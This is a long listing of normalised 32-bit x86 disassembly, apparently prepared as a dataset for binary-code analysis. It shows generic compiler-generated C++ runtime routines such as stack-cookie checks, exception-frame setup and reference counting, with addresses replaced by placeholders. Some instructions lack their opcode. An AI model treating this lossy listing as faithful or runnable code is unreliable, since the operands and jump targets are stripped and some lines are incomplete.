mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
call sub_407102
mov edx [ edi ]
mov ecx [ eax ]
mov [ eax ] edx
mov [ edi ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ edi + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax + 0x4 ] ecx
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop esi
leave
retn
call sub_40379c
sub_406b5e
test ecx ecx
je r-xdata
mov eax [ edi ]
mov [ edi ] ecx
test eax eax
je r-xdata
xor edx edx
lea eax [ ecx + 0x4 ]
inc edx
[ eax ] edx
mov eax edi
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2fe
pop esi
sub_406b96
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44e3f3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
push ebx
mov eax edi
call sub_407875
mov esi eax
cmp esi [ edi + 0x4 ]
je r-xdata
and [ esp + 0x8 ] 0x0
and [ esp + 0x40 ] 0x0
lea eax [ esp + 0x8 ]
push eax
push ebx
lea eax [ esp + 0x18 ]
push eax
call sub_4078b0
lea eax [ esp + 0x10 ]
push eax
push esi
lea eax [ esp + 0x14 ]
push eax
push edi
mov [ esp + 0x50 ] 0x1
call sub_40b14e
mov esi [ eax ]
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x44 ] 0x0
call sub_406a4d
lea eax [ esi + 0xc ]
mov edx ebx
call sub_403b02
test eax eax
jns r-xdata
lea eax [ esi + 0x28 ]
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x28 ]
xor ecx esp
call sub_4247dc
mov esp ebp
pop ebp
retn
sub_406c48
push 0x4
mov eax sub_44b555
call sub_448595
mov ebx ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi + 0x24 ] r--data
mov [ esi + 0x2c ] r--data
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push ebx
mov ecx esi
mov [ ebp - 0x10 ] edi
call sub_4060fc
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x24 ]
mov [ esi ] r--data
lea ecx [ esi + 0xc ]
mov [ ecx ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x24 ] r--data
mov eax [ esi + 0x24 ]
mov eax [ eax + 0x4 ]
lea edx [ eax - 0x8 ]
mov [ eax + esi + 0x20 ] edx
test ebx ebx
je r-xdata
xor ebx ebx
add ebx 0xc
jmp r-xdata
push ecx
call sub_4036cb
pop ecx
mov eax esi
call sub_44866d
retn 0x4
sub_406cd3
push ebx
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
mov ebx eax
jne r-xdata
lea eax [ ebx + 0xc ]
cmp [ eax ] 0x0
je r-xdata
call sub_406dc4
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
push edi
mov edi [ esi + 0x10 ]
call sub_40711b
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
mov eax 0x3ffffffe
pop edi
cmp ecx eax
je r-xdata
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx eax
je r-xdata
xor eax eax
cmp [ ebx ] 0x0
je r-xdata
lea eax [ edx + ecx ]
xor eax eax
inc eax
jmp r-xdata
mov [ esi ] al
mov eax esi
call sub_4071ea
sub_406da2
push ebp
mov ebp esp
mov al [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] al
jg r-xdata
xor eax eax
cmp al [ ebp + 0xc ]
jg r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0xc
sub_406dc4
mov al [ ebx ]
mov [ esi ] al
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
push edi
mov [ esi + 0x8 ] eax
lea eax [ ebx + 0xc ]
lea edi [ esi + 0xc ]
call sub_40711b
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
lea eax [ ebx + 0x14 ]
lea edi [ esi + 0x14 ]
call sub_40720c
mov eax [ ebx + 0x18 ]
mov [ esi + 0x18 ] eax
mov eax esi
pop edi
retn
sub_406e07
push ebp
mov ebp esp
push esi
mov esi ecx
lea ecx [ esi + 0x208 ]
call sub_402f60
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_406e3d
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_406e7c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44e08c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb8
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc0 ]
mov [ fs : 0x0 ] eax
cmp edi 0x8
je r-xdata
or [ esp + 0x8 ] 0xffffffff
lea eax [ esp + 0x14 ]
push eax
call sub_40797d
mov eax [ ebp + 0x8 ]
and [ esp + 0xc8 ] 0x0
lea esi [ esp + 0x10 ]
call sub_40751e
lea ecx [ esp + 0xc ]
mov [ esp + 0xc8 ] 0x1
push ecx
mov ecx [ esp + 0x18 ]
mov edx [ ecx + 0x4 ]
lea edx [ esp + edx + 0x18 ]
mov ecx eax
call sub_4073ae
lea ecx [ esp + 0xc ]
call sub_402f60
mov ecx esi
mov [ esp + 0xc8 ] 0x0
call sub_402f60
cmp edi 0x8
jne r-xdata
cmp edi 0xa
je r-xdata
mov eax sub_40362d
cmp edi 0x10
je r-xdata
mov eax sub_403647
jmp r-xdata
cmp edi 0x10
je r-xdata
push eax
lea esi [ esp + 0x28 ]
call sub_407391
push [ ebp + 0xc ]
mov eax esi
push eax
call sub_403b61
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_4073fd
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
test [ esp + eax + 0x20 ] 0x6
je r-xdata
mov eax sub_403613
push 0x233
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov esi [ esp + 0x8 ]
or esi 0xffffffff
jmp r-xdata
or [ esp + 0xc8 ] 0xffffffff
lea eax [ esp + 0x14 ]
call sub_40731c
mov eax esi
mov ecx [ esp + 0xc0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_406fab
push 0x4
mov eax sub_44e0b5
call sub_448595
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_40755a
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
lea esi [ ebp - 0x10 ]
call sub_40782e
mov esi [ ebp + 0x8 ]
mov edi eax
call sub_40784d
mov ecx eax
mov eax edi
call sub_407633
mov esi [ ebp + 0x8 ]
call sub_40784d
add eax 0x20
call sub_44866d
retn 0x4
call sub_40619e
sub_40700b
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
push esi
push edi
mov edi [ ebx + 0x4 ]
mov eax [ edi ]
mov [ esp + 0xc ] eax
jmp r-xdata
cmp eax edi
jne r-xdata
lea esi [ eax + 0xc ]
call sub_406b2e
push eax
mov ecx ebx
call sub_4076a3
lea eax [ esp + 0xc ]
call sub_407f40
mov eax [ esp + 0xc ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_407047
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44df01
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov eax [ ebx + 0x14 ]
mov eax [ eax ]
lea esi [ ebx + 0x10 ]
push esi
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_407a5c
and [ esp + 0x38 ] 0x0
mov eax [ ebx + 0x14 ]
push esi
push eax
lea eax [ esp + 0x24 ]
push eax
call sub_407a5c
mov [ esp + 0x38 ] 0x1
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x24 ]
jne r-xdata
lea esi [ esp + 0xc ]
call sub_406b2e
push eax
mov eax ebx
call sub_407665
lea eax [ esp + 0x14 ]
call sub_40a30e
mov edi esi
call sub_407f79
mov [ esp + 0x38 ] 0x0
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
or [ esp + 0x38 ] 0xffffffff
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
call sub_40379c
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_40379c
sub_40711b
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ edi ]
mov [ edi ] eax
test ecx ecx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov eax edi
retn
push esi
lea esi [ ecx + 0x4 ]
call sub_40c2c3
pop esi
sub_4071ea
mov ecx [ eax + 0x4 ]
cmp ecx 0x3ffffffe
je r-xdata
push 0x2
pop ecx
cmp [ eax ] 0x0
je r-xdata
xor edx edx
test ecx ecx
setne dl
mov ecx edx
jmp r-xdata
mov [ eax + 0x8 ] ecx
retn
sub_40720c
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ edi ]
mov [ edi ] eax
test ecx ecx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov eax edi
retn
push esi
lea esi [ ecx + 0x4 ]
call sub_40c2c3
pop esi
sub_407273
push 0x24
mov eax sub_44d86e
call sub_448595
push 0xa
mov eax r--data
lea esi [ ebp - 0x30 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x4a
push r--data
push r--data
push eax
call sub_405e22
sub_4072ac
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov ecx [ edi + 0x8 ]
mov eax [ ecx ]
pop edi
pop esi
pop ebp
jmp [ eax + 0x4 ]
sub_4072c6
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
test edi edi
je r-xdata
xor eax eax
lea eax [ edi + 0x8 ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
push eax
call sub_407aac
lea esi [ edi + 0xc ]
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_407371
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_407391
push ebp
mov ebp esp
test esi esi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
xor eax eax
jmp r-xdata
push eax
call [ ebp + 0x8 ]
pop ecx
mov eax esi
pop ebp
retn 0x4
sub_4073ae
push 0x8
mov eax sub_44b516
call sub_448595
mov edi ecx
mov ebx edx
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x10 ] 0x0
push [ ebp + 0x8 ]
call sub_4034b6
and [ ebp - 0x4 ] 0x0
mov ecx [ ebx + 0x38 ]
mov [ ebp - 0x10 ] 0x1
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn 0x4
push edi
lea eax [ ebp - 0x14 ]
push eax
call sub_407b8e
lea ecx [ ebp - 0x14 ]
call sub_402f60
sub_4073fd
push 0x2c
mov eax sub_44ded6
call sub_4485c8
mov edi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_403c7d
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x1c ] ebx
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x20 ]
call sub_4034a7
push eax
mov [ ebp - 0x4 ] 0x1
call sub_40b1b6
pop ecx
lea ecx [ ebp - 0x20 ]
mov esi eax
call sub_402f60
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x38 ]
cmp ecx ebx
lea ebx [ ebp - 0x1c ]
push ebx
lea ebx [ ebp - 0x18 ]
push ebx
push eax
sete dl
mov [ ebp - 0x2c ] 0x1
push [ ebp - 0x2c ]
xor eax eax
push eax
mov [ ebp - 0x34 ] dl
push [ ebp - 0x34 ]
mov edx [ esi ]
push ecx
lea eax [ ebp - 0x38 ]
push eax
mov ecx esi
call [ edx + 0x20 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp sub_4074b3
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
call sub_403cb6
mov eax edi
call sub_44866d
retn 0x8
mov eax [ ecx + 0xc ]
or eax [ ebp - 0x18 ]
push ebx
call sub_404912
sub_4074b3
test [ ebp - 0x18 ] 0x2
jne r-xdata
or [ ebp - 0x18 ] 0x2
mov eax [ ebp - 0x1c ]
lea ecx [ eax - 0x80000000 ]
cmp ecx 0xffffffff
ja r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
call sub_403cb6
mov eax edi
call sub_44866d
retn 0x8
mov eax [ ecx + 0xc ]
or eax [ ebp - 0x18 ]
push ebx
call sub_404912
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
sub_40755a
push 0x14
mov eax sub_44d84b
call sub_448595
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] ebx
inc edi
mov [ ebp - 0x14 ] edi
cmp [ esi ] ebx
je r-xdata
mov eax esi
mov esi [ ebp + 0xc ]
call sub_407e7a
mov eax [ ebp + 0x8 ]
call sub_407c77
test al al
je r-xdata
call sub_40784d
mov eax [ eax + 0x28 ]
cmp eax edi
je r-xdata
push 0x50
call sub_424ff8
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] edi
cmp esi ebx
je r-xdata
push 0x1e2
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov eax [ ebp + 0xc ]
call sub_44866d
retn 0x8
xor eax eax
call sub_407c93
jmp r-xdata
call sub_40379c
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ebx
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x2
call sub_40d732
pop ecx
pop ecx
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x3
call sub_406b2e
lea edi [ eax + 0x20 ]
mov ecx esi
call sub_406adc
mov ecx [ eax ]
mov esi [ ebp + 0x8 ]
call sub_407e9c
mov [ ebp - 0x4 ] bl
mov esi [ ebp - 0x1c ]
cmp esi ebx
je r-xdata
sub_407633
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi eax
mov ebx ecx
cmp ebx edi
je r-xdata
pop edi
pop ebx
leave
retn
sub esp 0x50
mov eax esp
mov [ ebp - 0x4 ] esp
push eax
call sub_407cb6
mov edi ebx
call sub_407da0
call sub_40700b
call sub_407047
sub_407665
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov edi eax
mov ecx edi
call sub_407dcc
lea eax [ edi + 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_40b83a
push eax
push [ ebp + 0x8 ]
lea esi [ ebp - 0xc ]
call sub_40bac9
mov edi [ edi + 0x4 ]
mov eax [ edi ]
mov esi [ ebp + 0x8 ]
push edi
push eax
call sub_40b2a4
pop edi
pop esi
leave
retn 0x4
sub_4076a3
push 0x30
mov eax sub_44e05b
call sub_448595
mov edi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
call sub_44866d
retn 0x4
lea eax [ edi + 0x20 ]
add ebx 0x10
push eax
mov eax ebx
call sub_40d788
push ebx
lea esi [ ebp - 0x1c ]
call sub_40bc8b
mov eax [ edi + 0x14 ]
mov eax [ eax ]
lea esi [ edi + 0x10 ]
push esi
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_407a5c
and [ ebp - 0x4 ] 0x0
mov edi [ edi + 0x14 ]
push esi
push edi
lea eax [ ebp - 0x2c ]
push eax
call sub_407a5c
sub esp 0x24
mov [ ebp - 0x4 ] 0x1
mov edi esp
mov [ ebp - 0x14 ] esp
sub esp 0x10
mov esi esp
lea ecx [ ebp - 0x2c ]
mov eax esi
mov [ ebp - 0x18 ] esp
call sub_407102
mov eax [ ebp - 0x24 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x20 ]
sub esp 0x10
mov [ esi + 0xc ] eax
mov esi esp
lea ecx [ ebp - 0x2c ]
mov eax esi
mov [ ebp - 0x18 ] esp
call sub_407102
mov eax [ ebp - 0x24 ]
push [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x20 ]
push edi
mov [ esi + 0xc ] eax
call sub_40b2f0
add esp 0x4
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x18 ] esp
mov edi esp
sub esp 0x10
mov esi esp
lea ecx [ ebp - 0x2c ]
mov eax esi
mov [ ebp - 0x18 ] esp
call sub_407102
mov eax [ ebp - 0x24 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x20 ]
sub esp 0x10
mov [ esi + 0xc ] eax
mov esi esp
lea ecx [ ebp - 0x3c ]
mov eax esi
mov [ ebp - 0x18 ] esp
call sub_407102
mov eax [ ebp - 0x34 ]
push [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x30 ]
push edi
mov [ esi + 0xc ] eax
call sub_40b2f0
add esp 0x28
mov esi ebx
mov [ ebp - 0x4 ] 0x1
call sub_40b38f
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x28 ]
test esi esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x38 ]
test esi esi
je r-xdata
call sub_40379c
call sub_40379c
sub_407875
push ebp
mov ebp esp
mov eax [ eax + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
jmp r-xdata
cmp [ esi + 0x2d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ esi + 0xc ]
call sub_403b02
test eax eax
jns r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
mov edi esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
sub_4078b0
push 0x0
mov eax sub_44e3c6
call sub_448595
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_404720
and [ ebp - 0x4 ] 0x0
lea ebx [ esi + 0x1c ]
and [ ebx ] 0x0
mov [ ebp + 0xc ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_407bf1
mov eax esi
call sub_44866d
retn 0xc
sub_407925
push 0x2c
mov eax sub_44d7fd
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_407ec6
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_40797d
push 0x4
mov eax sub_44e027
call sub_448595
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ esi + 0x60 ] r--data
and [ ebp - 0x4 ] 0x0
lea ebx [ esi + 0x18 ]
xor edi edi
push ebx
inc edi
push esi
mov [ ebp - 0x10 ] edi
call sub_407ef3
mov [ ebp - 0x4 ] edi
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push ebx
mov [ esi + eax ] r--data
call sub_404bb2
mov eax esi
call sub_44866d
retn 0x4
sub_4079d7
push 0x4
mov eax sub_44caf8
call sub_448595
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x60 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x60 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_404006
mov ecx esi
call sub_407a0f
call sub_44866d
retn
sub_407a5c
push 0x0
mov eax sub_44cad2
call sub_448595
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0xc ] eax
call sub_407f79
mov eax edi
call sub_44866d
retn 0xc
sub_407aac
push ebp
mov ebp esp
mov edx esi
call sub_408a83
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
and [ esi + 0xc ] 0x0
sub_407aea
push 0x0
mov eax sub_44caaf
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x18 ]
test esi esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
call sub_40379c
call sub_44866d
retn 0x4
call sub_40379c
sub_407b21
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov eax esi
call sub_40731c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_407b43
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov eax esi
call sub_407b74
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_407b8e
push 0x4
mov eax sub_44a71f
call sub_448595
mov ebx [ ebp + 0x8 ]
mov esi ecx
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] edi
mov eax [ esi + 0x38 ]
mov ecx [ eax ]
mov [ ebx ] ecx
call sub_402eaf
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov ecx esi
mov [ ebp - 0x10 ] 0x1
call [ eax + 0x38 ]
mov esi [ esi + 0x38 ]
call sub_402f78
mov eax ebx
call sub_44866d
retn 0x8
sub_407bf1
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi eax
push edi
cmp ebx esi
je r-xdata
pop edi
mov eax ebx
pop esi
leave
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
call sub_407c77
test al al
jne r-xdata
mov esi ebx
call sub_40784d
sub esp 0x50
mov esi esp
mov edi eax
mov [ ebp - 0x4 ] esp
call sub_407c93
call sub_407da0
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_40755a
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_407c77
test al al
jne r-xdata
call sub_40782e
mov esi ebx
mov edi eax
call sub_40784d
mov ecx eax
mov eax edi
call sub_407633
jmp r-xdata
call sub_40619e
mov eax esi
mov esi ebx
call sub_407e7a
jmp r-xdata
sub_407c77
push esi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
pop esi
retn
call sub_40784d
cmp [ eax + 0x18 ] 0x0
je r-xdata
xor eax eax
inc eax
pop esi
retn
sub_407c93
push esi
call sub_408adc
xor eax eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
mov eax esi
retn
sub_407cb6
push 0x0
mov eax sub_44d7da
call sub_448595
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_408b22
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x2c ]
mov [ esi + 0x2c ] eax
test eax eax
je r-xdata
mov eax [ edi + 0x30 ]
mov [ esi + 0x30 ] eax
test eax eax
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
mov eax [ edi + 0x34 ]
mov [ esi + 0x34 ] eax
test eax eax
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
lea eax [ esi + 0x38 ]
lea ecx [ edi + 0x38 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_408ed8
mov eax [ edi + 0x48 ]
mov [ esi + 0x48 ] eax
mov eax [ edi + 0x4c ]
mov [ esi + 0x4c ] eax
mov eax esi
call sub_44866d
retn 0x4
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_407d32
push 0x0
mov eax sub_44ca8c
call sub_448595
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x3
call sub_409b1b
mov [ ebp - 0x4 ] 0x2
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c339
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x2c ]
test eax eax
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2fe
or [ ebp - 0x4 ] 0xffffffff
push edi
call sub_408966
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_407dcc
push 0x24
mov eax sub_44de86
call sub_448595
mov esi ecx
mov eax [ esi + 0x14 ]
mov eax [ eax ]
lea edi [ esi + 0x10 ]
push edi
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_407a5c
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x14 ]
push edi
push esi
lea eax [ ebp - 0x30 ]
push eax
call sub_407a5c
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x28 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
call sub_40a30e
lea edi [ ebp - 0x20 ]
call sub_407f79
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x2c ]
test esi esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x1c ]
test esi esi
je r-xdata
call sub_40379c
call sub_44866d
retn
call sub_40379c
sub_407e7a
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx eax
mov eax [ esi ]
mov [ esi ] ecx
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x28 ]
inc edx
[ ecx ] edx
mov eax esi
retn
call sub_40619e
sub_407e9c
test ecx ecx
je r-xdata
mov eax [ esi ]
mov [ esi ] ecx
test eax eax
je r-xdata
xor edx edx
lea eax [ ecx + 0x28 ]
inc edx
[ eax ] edx
mov eax esi
retn
call sub_40619e
sub_407ec6
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_407ef3
push 0x4
mov eax sub_44dfe5
call sub_448595
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push esi
call sub_408a34
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x10 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax esi
call sub_44866d
retn 0x8
sub_407f40
mov ecx [ eax ]
push ebx
xor bl bl
cmp [ ecx + 0x15 ] bl
jne r-xdata
pop ebx
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] bl
je r-xdata
jmp r-xdata
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] bl
je r-xdata
mov [ eax ] ecx
mov edx ecx
mov [ eax ] edx
pop ebx
retn
sub_407f79
push 0xc
mov eax sub_44ca47
call sub_448595
mov eax [ edi + 0xc ]
mov eax [ eax + 0x4 ]
cmp [ edi + 0x8 ] eax
je r-xdata
and [ edi ] 0x0
mov esi [ edi + 0x4 ]
and [ edi + 0x4 ] 0x0
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
add eax 0xc
push eax
